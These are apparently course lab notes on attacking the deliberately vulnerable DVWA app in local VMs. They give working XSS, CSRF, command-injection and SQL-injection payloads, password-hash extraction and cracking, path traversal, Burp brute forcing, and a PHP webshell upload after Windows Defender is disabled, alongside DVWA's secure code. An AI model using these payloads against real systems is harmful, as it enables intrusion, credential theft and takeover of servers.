# Table of Content
[toc]

## XAMPP
**Win10 VM**
- We will be using **DVWA - Damn Vulnerable Web Application**, which requires the Apache Web Server and MariaDB (*open source version of MySQL*). 
- XAMPP is an Apache distribution containing MariaDB, PHP and Perl
- You can download the latest version of XAMPP from www.apachefriends.org
- On the XAMPP Control Panel, you can start the **Apache Web Server** and **MySQL Server**.
## DVWA
### Setup
- Extract and move the DVWA-master folder into **C:\xampp\htdocs**.
- Make a copy of **C:\xampp\htdocs\DVWA-master\config\config.inc.php.dist** and rename it to ***config.inc.php***
- Set the MySQL password to blank and save the file
```php
$_DVWA = array();
$_DVWA['db_server'] = '127.0.0.1';
$_DVWA['db_database'] = 'dvwa';
$_DVWA['db_user'] = 'root';    # Shldn't use root on production web apps
$_DVWA['db_password'] = ''     # Password is blank
```
- Go to https://127.0.0.1/DVWA-master
	- If you receive a **database error,** try creating an empty MySQL database entry through the shell of the XAMPP Control Panel following the snippet below
	```cmd
	Setting environment for using XAMPP for Windows.
	...
	# mysql -u root -p
	Enter password:
	...
	MariaDB [(none)]> create database dvwa;
	Query OK, 1 row affected...
	```
- Click "Create/Reset Database" in the database setup page.
	![[Pasted image 20220705133928.png]]
- Login with username, "**admin**" and password, "**password**"
- Go to DVWA Security. Set the security level to **low**.

## Reflected Cross-Site Scripting
- Reflected XSS happens when user input is displayed on the result's page
---
- Go to http://127.0.0.1/DVWA-master/ and click on **XSS (Reflected)**
- Type any string and submit 
	- It will be displayed on the webpage
- Now, if we were to type the following into the textbox and click Submit
	- We should see a popup with the output.
```html
<script>alert("hello world!");</script>
```
- If were to click the View Source button on the lower right corner of the webpage, we would be able to see the source code of the webpage.

Source code from the XSS above
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Feedback for end user
	echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```
- Now, go to DVWA Security and change the security level to **Impossible**.
- Repeat the following into the textbox and click Submit
	- This time, the script didn't run, so no pop-up appears.
```html
<!-- Input the following into the textbox -->
<script>alert("haha");</script>
```
- Click the View Source button again, we can see that the user's input is santized by passing through a special function called *`htmlspecialchars`*.

Source code 
```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$name = htmlspecialchars( $_GET[ 'name' ] );

	// Feedback for end user
	echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
- Go to DVWA Security and change the security level to low
- Enter the following into the textbox and click Submit
	- You will be redirected to Google
```html
<script>document.location="https://www.google.com"</script>
```
## Stored Cross-Site Scripting
- Stored XSS happens when user input is stored by the web server and displayed on web pages to other users.
---
- Go to http://127.0.0.1/DVWA-master/ and click on **XSS (Stored)**
- Check that the security level is **Low**
- Type name into Name textbox 
   Then type the following for message and click Sign Guestbook
```html
<script>alert("haha");</script>
```
- Now every time anyone clicks on XSS (stored) to see the Guestbook, the popup will appear


- Type the following for message
	- When users see the Guestbook, they will be redirected to another website (google.com)
```html
<script>document.location="https://www.google.com"</script>
```


Creating a fake login:
- Click on XSS (Stored)
- Type name into Name textbox
- Enter the following into the message and click Sign Guestbook. 
	- Adjust the Message maxlength to 200 if needed.
```html
Login to see more features:<br>
<form>
Username : <input type="text"><br>
Password : <input type="password"><br>
<input type="submit" value="login">
</form>
```
- When created, this acts as a fake login form and any visitors who are not careful might fill in their username and password, with this information potentially being sent to the hacker.

Reset Database: Setup > Create/Reset Database

## Cross-Site Request Forgery (CSRF)
- Cross-site request forgery can happen when a user is currently logged in to a trusted site and the attacker causes his browser to send an unwanted request to the trusted site.
---
- Go to http://127.0.0.1/DVWA-master/ and click on CSRF
- Check that the security level is **Low**
- View the HTML Source code. 
	- Note that the form method for entering the new password is "GET"
	- Means the user input will be passed through a query string in the URI.

Source Code
```html
<h3>Change your admin password:</h3><br/>
<form action="#" method="GET">
```

- Enter "password" for the New and Confirm password.
	- You can take note that the new password values are passed in the URI textbox.
![[Pasted image 20220707005732.png]]
### CSRF Example 1
- Create a new file "csrf.html" with the following content in a single line, replacing *Win10-IP* with the IP address of your Win10 VM
```html
<!-- This is a very new web page. -->
<img width="1" src="http://_Win10-IP_/dvwa-master/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">
```
- Key points to note in the HTML above
	- The image width is set to `1` so it won't get noticed on the displayed web page.
	- The image source is set to the URI displayed when you change the admin password.
- Change the "password_new" and "password_conf" to a new value like "12345678"

- Click on CSRF and View Source. Compare all the different security level. Below are the source codes for Low, High and Impossible.

Security Level: Low
```php
// Security Level: Low
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

Security Level: High
- Notice that the web application checks for a session token before password change is allowed
```php
// Security Level: High
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
Security Level: Impossible
- Besides checking for a session token, the user is asked to enter his current password before password change is allowed.
```php
// Security Level: Impossible
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_curr = $_GET[ 'password_current' ];
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Sanitise current password input
    $pass_curr = stripslashes( $pass_curr );
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_curr = md5( $pass_curr );

    // Check that the current password is correct
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
    $data->execute();

    // Do both new passwords match and does the current password match the user?
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
        // It does!
        $pass_new = stripslashes( $pass_new );
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database with new password
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->execute();

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match or current password incorrect.</pre>";
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
### CSRF Example 2
- Browse to https://www.imdb.com. Click on a couple of movies to view their pages.
- Create a new file "imdb.com" wit hthe following contents.
```html
<iframe width="1" height="1" src="https://www.imdb.com/title/tt0803096">
</iframe>
<br>
Good day
```
- While you are still in the IMDB website, right click on the imdb.html file and open it in the same browser. 
	- The web browser will automatically load the page from IMDB but because the iframe is only 1 pixel, you may miss seeing it.
	- Back in the browser in IMDB website showing your recently visited pages and refresh the page.

## Command Injection
- This webpage allows the user to ping another system. However, it can also be used to execute other commands.
---
- Go to http://127.0.0.1/DVWA-master/ and click on Command Injection. Ensure that the Security Level is set to low.
- Type in the IP of your Host PC or another VM. The results of the ping will be displayed after a few seconds.
- Type in an IP, followed by " && dir c:\\" and click Submit
	- You will see the directory listing of the C drive of the Win10 VM.
	- A hacker could potentially run commands from the client side to read files, delete files, add users, etc, on the Web Server
```linux
192.168.206.1 && dir c:\
```

## SQL Injection
**Win10 VM**

Problem Solving process for SQL Injections:
- Go to http://127.0.0.1/DVWA-master/ and click on SQL Injection.
- For the User ID, type in "1", "2", "3", etc to see the user details displayed.
- The SQL statement for retrieving the user records probably looks like the following.
```SQL
SELECT firstname, surname FROM user WHERE userid = '$id'
```
- So when you type 1 for the UserID, the SQL statement becomes:
```SQL
SELECT firstname, surname FROM user WHERE userid = '1'
```
- Type in the following into the User ID input field
```SQL
ppp' OR '0' = '0
```
 - The SQL statement now becomes the following
	 - The SQL statement now will retrieve all the users from the table so you will see a list of all users displayed
```SQL
SELECT firstname, surname FROM user WHERE userid = 'ppp' OR '0' = '0'
```
> Can we get more information about the users? 
> There should be a **table containing the user information.** 
> What would be the name of this table containing user information?

- Let assume that the table name is "user".
- Type in the following into the User ID input field
```SQL
ppp' OR '0' = '0' UNION SELECT userid, user FROM user #
```
OR
```SQL
ppp' OR '0' = '0' UNION SELECT userid, user FROM user --
```
- The SQL statement now becomes the following.
	- The # or -- means to treat the rest of the line as a comment.
	- Note that different databases (e.g. MySQL, Microsoft SQL, etc) may support different characters as comments.
```SQL
SELECT firstname, surname FROM user WHERE userid = 'ppp' OR '0' = '0' UNION SELECT userid, user FROM user #'
```
- However, we get an error message that the table dvwa.user does not exist. So let's try the table name "users."
- Type in the following into the User ID input field
	- Now we get the error message that the column "userid" is unknown. Let's try "user_id" for the colum name.
```SQL
ppp' or '0' = '0' union select userid, user from users #
```
- Type in the following into the input field
	- Now, the records are displaying the User IDs and Users.
```SQL
ppp' or '0' = '0' union select user_id, user from users -- 
```
--- 
Extracting passwords from tables:
- Type in the following into the User ID input field
	- Hashed passwords are now displayed.
```SQL
ppp' or '0' = '0' union select user_id, password from users #
```

Cracking passwords:
- Create a text file and on a single line, enter the User ID, followed by a colon, and then the hashed password.
![[Pasted image 20220710191705.png]]
- Save the file as passwd.txt and copy it to your Kali VM
---

In MySQL, there is a special database `information_schema` that contains a table called "tables" which holds information about the tables. We can use SQL injection to list out all the table names in all databases.

- Using SQL Injection
	- We can get the list of all the tables and the databases they are in (schema)
```SQL
ppp' OR '0' = '0' UNION SELECT table_schema, table_name FROM information_schema.tables # 
```

### John The Ripper
> There are multiple resources for password cracking such as Hashcat and John The Ripper. For our example, we will be using `John The Ripper`

**Kali VM**
- With the use of John the Ripper, a password cracking program. We can try to crack the hashed passwords in your passwd.txt file.
	- If John the Ripper does not seem to return any results, press Control-C to stop the program.
```linux
sudo john passwd.txt
```
- Try running John the Ripper with the various suggested formats. (Hint : try the raw-md5 format).
```linux
sudo john --format=raw-md5 passwd.txt
```
![[Pasted image 20220710192220.png]]


## Forced Browsing
In Forced Browsing vulnerabilites, by changing the URL, you can see the web content that you are not supposed to view.

---
**Win10 VM**
- Click on File Inclusion and ensure that the Security Level is Low.
- Click on **file1.php**. Note that the URL looks like the following :
```linux
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file1.php
```
- Click on **file2.php**. Note that the URL looks like the following :
```linux
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file2.php
```
- Click on **file3.php**. Note that the URL looks like the following :
```linux
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file3.php
```
- Is there a file4.php? Change the URL to the following the find the "hidden" file4.php
```linux
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file4.php
```

### File Inclusion
In the File or Path Inclusion vulnerabilities, the path to the web resoucres on the web server are displayed. This can give potential attackers information about how web pages and other resources are stored on the web server.

---

**Win10 VM**
- Click on File Inclusion and ensure that the Security Level is Low.
- Change the URL to the following to request for a non-existent page. (e.g. change "include.php" to "include2.php")
	- Note that the error message displayed contains information about the full path to the page -- `C:\xampp\htdocs\DVWA-master`.
```linux
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=include2.php
```
Can we change the URL to browse to other files on the web server?
- Change the URL to the following to view the configuration file of the Apache Web Server. (figuring out the exact path to the config file normally takes some trial and error)
```linux
http://_Win10-IP_/dvwa-master/vulnerabilities/fi/?page=..\..\..\..\apache\conf\httpd.conf
```
- While the format of the config file may not seem esay to read at first glance, an experienced attacker will save the file and view it using correct text viewer to find important information.
![[Pasted image 20220710194630.png]]
- Change the DVWA Security level to High and repeat the request for a non-existent page. This time, the error message does not give away any information about the webroot.

## BurpSuite to Brute Force Passwords
Intercepting Proxies can be used to crawl websites and intercept and modify HTTP requests/responses. Paros and Burpsuites are examples of intercepting proxies.

![[Pasted image 20220710194849.png]]
We will be using BurpSuite which is already installed in Kali

---
**Kali VM**
- Start Firefox and browse to the DVWA on your Win10 VM.
	- If you are unable to connect to DVWA on your Win10, check if the Windows Firewall on Win10 is blocking your access. Add an Exception for Port 80 if required.
```linux
http://192.168.2.130/dvwa-master
```
- Login to DVWA. 
	- Default username: **admin**
	- Default password: **password**
- Click on DVWA Security and set the security level to low.
- Go to Application, **03 Web Applications Analysis**, burpsuite. (OR run "sudo burpsuite" in a terminal)
	-  If there is a message about Java JRE, click OK. If asked to update the software, you can click click Cancel or Close.
	- Choose the default Temporary Project and Click Next.
	- Use Burp default values and click Start Burp.
	- Click on the Proxy tab. If one of the buttons has the words "Intercept is on", click it to turn Intercept off.
	![[Pasted image 20220710201254.png]]
- Now configure the Firefox Browser to use Burpsuite as the proxy. 
	- **Note** : you can also choose to use Burp's built-in Chromium web browser
	- In the Firefox browser, click on the Open Menu icon. Click on Preference
	-![[Pasted image 20220710201937.png]]
	- Scroll down the General Preferences. Under Network Settings, for "Configure how Firefox connects to the Internet", click Settings.
	![[Pasted image 20220710201815.png]]
	- Select "Manual proxy configuration"
		- For HTTP Proxy, enter "127.0.0.1". For Port, enter "8080". Check the box "Use this proxy server for all protocols"
		- Click OK and close Preferences. 
	- Now all the HTTP requests and responses will be passing through BurpSuite.
	  ![[Pasted image 20220710202314.png]]
- In the Web Browser, click on some of the menu items in DVWA.
- In BurpSuite, click on Target tab, Site Map. Expand your Win10 IP and dvwa-master.
	- You will see that the structure of the DVWA has been captured, plus the HTTP requests and responses.
	![[Pasted image 20220710202548.png]]
	- Now, we can try to brute force a password in DVWA using BurpSuite and dictionary lists.
- Open a terminal and create a file `my_user_list` with the following 2 usernames that we will try. 
	- Make sure that the correct username "admin" is in the list.
	![[Pasted image 20220710203302.png]]
- Create another file `my_password_list` with the following 3 passwords that will try.
	- Make sure that admin's correct password is in the list.
	  ![[Pasted image 20220710233633.png]]
- In the Web Browser, broswe to the DVWA Brute Force.
- In BurpSuite, click on Proxy tab and set "Intercept is on".
- In the Web Browser, type "admin" for the username and "12345678" for the password. Click Login.
- The HTTP request that you sent is intercepted by Burp. In Burp, look for the HTTP request that contains the Brute Force submitted form with the username "admin" and password "12345678" that was just sent.
	- If you see another HTTP packet that **does not contain "admin" and "12345678",** click Forward to forward the packet to its destination.
	  ![[Pasted image 20220710233712.png]]
	- If you see the HTTP packet that **contains the Brute Form submitted form**, click on "Action" and choose "send to intruder".
	  ![[Pasted image 20220710234246.png]]
- Under the Intruder tab, click on Positions tab. You will see the HTTP request that is being sent, with the parameters highlighted
- In the right hand side, click on Clear to clear the highlighted paramters.
- Select the username value "admin" and click Add. (see following diagram)
  ![[Pasted image 20220710233837.png]]
- Select the password value "12345678" and click Add. 
	- You now have 2 payloads : username and password.
- Change the attack type of "cluster bomb".
- ![[Pasted image 20220710234121.png]]
- Click on the payload tab. Check that payload set "1" is selected. This is for the username. 
	- Under Payload options, click on load and browse to your file `my_user_list`. 
	- Click Open and the 2 usernames will be loaded.
	  ![[Pasted image 20220710234318.png]]
- Change the payload set to "2". This is for the password. 
	- Click on load and browse to `my_password_list`. 
	- Click Open and 3 passwords will be loaded.
- Click on the Options tab. Scroll down and ensure that "Store requests" and "Store responses" are checked. (see following diagram)
  ![[Pasted image 20220710235125.png]]
- In the Intruder menu, scroll up and in the top right corner, click "Start attack"
  ![[Pasted image 20220710235203.png]]
- Burp will try all combinations of the 2 usernames and 3 passwords. 
	- When the results are displayed, select one of the wrong username/password combinations and click on response tab. 
	- Scroll down the HTTP response and you will see the error message "Username and/or password incorrect" being returned.
	![[Pasted image 20220710235343.png]]
- Select the correct admin/password and click on response tab.
	- Scroll down the HTTP response and you will see the message "Welcome to the password protected area admin" being returned.
	![[Pasted image 20220710235607.png]]
	- Usually when a right username and password is found, the response page will contain different text. 
		- By looking at the lengths of the response pages,the one with a different length could possibly contain the correct username and password.
	- If you know the content of a successful login, you can configure BurpSuite to look out for certain strings in the web responses for each username and password configuration.
- Close the Intruder Attack window.
- In BurpSuite, under the Options tab, scroll down to the "Grep - match" section.
	- Click Clear to clear the list.
	- In the Add textbox, type the string "welcome" and click Add.
	  ![[Pasted image 20220711003142.png]]
	- When you start the Intruder attack, BurpSuite will look for web responses containing the string "welcome".
- Scroll up and click "Start Attack"
- This time, BurpSuite will flag out the username/password combination that resulted in a web response containing the string "welcome".
  ![[Pasted image 20220711003237.png]]
- In the Web Browser, remove the proxy settings (set back to No proxy) so that your HTTP data no longer passes through BurpSuite.
- Browse to the Brute Force page and click "View Source" in the lower right corner.
	- Scroll down and click on "Compare All Levels" to see the different source code for Low, High and Impossible Security levels.

Security Level: Low
```php
// Security Level: Low

<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

Security Level: High
- When Login fails, there is a "sleep(rand(0, 3))" statement. How can this help discourage brute force attacks?
- This helps as it prevents the attacker from constantly sending attacks to the server.
```php
// Security Level: High

<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```
Security Level: Impossible
- If the password is entered wrongly 3 times, the account is locked for 15 minutes. This will help deter brute force attacks on passwords.
```php
// Security Level: Impossible

<?php

if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_POST[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_POST[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Default values
    $total_failed_login = 3;
    $lockout_time       = 15;
    $account_locked     = false;

    // Check the database (Check user information)
    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // Check to see if the user has been locked out.
    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
        // User locked out.  Note, using this method would allow for user enumeration!
        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

        // Calculate when the user would be allowed to login again
        $last_login = strtotime( $row[ 'last_login' ] );
        $timeout    = $last_login + ($lockout_time * 60);
        $timenow    = time();

        /*
        print "The last login was: " . date ("h:i:s", $last_login) . "<br />";
        print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";
        print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";
        */

        // Check to see if enough time has passed, if it hasn't locked the account
        if( $timenow < $timeout ) {
            $account_locked = true;
            // print "The account is locked<br />";
        }
    }

    // Check the database (if username matches the password)
    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR);
    $data->bindParam( ':password', $pass, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // If its a valid login...
    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
        // Get users details
        $avatar       = $row[ 'avatar' ];
        $failed_login = $row[ 'failed_login' ];
        $last_login   = $row[ 'last_login' ];

        // Login successful
        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";
        echo "<img src=\"{$avatar}\" />";

        // Had the account been locked out since last login?
        if( $failed_login >= $total_failed_login ) {
            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
        }

        // Reset bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    } else {
        // Login failed
        sleep( rand( 2, 4 ) );

        // Give the user some feedback
        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

        // Update bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }

    // Set the last login time
    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```
## File Upload 
### File Upload to upload malicious files
Many web applications allow users to upload files, e.g. photos, videos. The web application has to check the uploaded files, otherwise users may upload malicious file to the web server.

---
**Kali VM**
- Go to http://127.0.0.1/DVWA-master/ and click on File Upload.
- Check that the Security Level is low.
	- The File Upload feature is meant for users to upload images. But when the Security Level is low, the web application does not check the file type being uploaded.
- We will create a HTML page to be uploaded.
	- Using a text editor, create a file "abc.html" and enter some text into it.
	```html
	<!-- Enter this into the file, "abc.html" -->
	This is abc
	```
- In DVWA
	- Click Browse
	- Select the file, "abc.html" and upload it to the server
	- The file will be uploaded to the web serve rand the path to it will be displayed.
	![[Pasted image 20220711135810.png]]

- In the Web Browser, browse to the uploaded file
	- With no checking, users can create HTML pages with malicious content and upload them directly to the web server
	  ![[Pasted image 20220711140408.png]]

```linux
http://192.168.2.130/dvwa-master/hackable/uploads/abc.html
```
- We will now try to upload a script that can give us a backdoor to run commands on the web server.

**Kali VM**
- You can create or use tools to create such scripts. In this example, we will use a ready-made script in Kali
	- In a terminal, list the contents of `/usr/share/webshells`
- The scripts are categorised according to different programming languages. We need to find out which programming language is supported by the DVWA web application.
	- You can use the version scan option on Nmap
	```linux
	nmap -sV
	```
- List out the contents of the `php` directory
- We will try the `simple-backdoor.php` script.
	- Make a copy of it to the `/tmp` directory.
	```linux
	cp /usr/share/webshells/php/simple-backdoor.php /tmp
	```
- View the `/tmp/simple-backdoor.php` script
	- This script can allow us to run commands on the web server.
- In DVWA File Upload, browse to `simple-backdoor.php` script and upload it.
![[Pasted image 20220711140904.png]]

**Win10 VM**
- In the Win10 VM, look in the contents of `C:\xampp\htdocs\hackable\uploads` folder.
	- The `simple-backdoor.php` script should be uploaded there.
	![[Pasted image 20220711141231.png]]

**Kali VM**
- Browse to the uploaded script to run it.
	- However, you may get an error like the following screenshot.
	- So the script was not able to run.

**Win10 VM**
- Check the contents of `C:\xampp\htdocs\hackable\uploads` folder. The `simple-backdoor.php` script has been removed.
	- This is because Windows Defender running on the Win10 is monitoring the target and detected the attempt to run a possible malicious script.
- To get this exercise to work, we will need to disable the Real-Time Protection of the Windows Defender. 
	- In the Search textbox, type "Windows Defender" or "Windows Security" and run it.
	- If in Windows Defender, click on Settings. If in Windows Security, click on Virus and Threat Protection, and click Manage Settings.
	- Turn Real-Time Protection off.

**Kali VM**
- In DVWA File Upload, browse to `simple-backdoor.php` script and upload it again.
- Browse to the uploaded script to run it. This time, the script can be run.
- Change the URL to run commands on the Win10. 
	- Use the plus sign (+) if there are spaces in your command.
- Can we run this command to add a new user on Win10?
![[Pasted image 20220711142003.png]]
```linux
net user secretuser 1q2w3e4r! /add
```
- The command to add a new user on Win10 does not work.
	- When you view the users on Win10 VM, the new user is not listed.
	- This is because Windows 10 User Account Control (UAC), the administrator is treated as a normal user by default, and is not able to run administration task.
- This vulnerabilitiy to run commands on the web server exists because the web application allows us to upload any type of files.
	- Look at the source code for Security Level Impossible and see how the web application tries to ensure that the uploaded file is either a JPED or PNG format.

### File Upload to upload a reverse shell
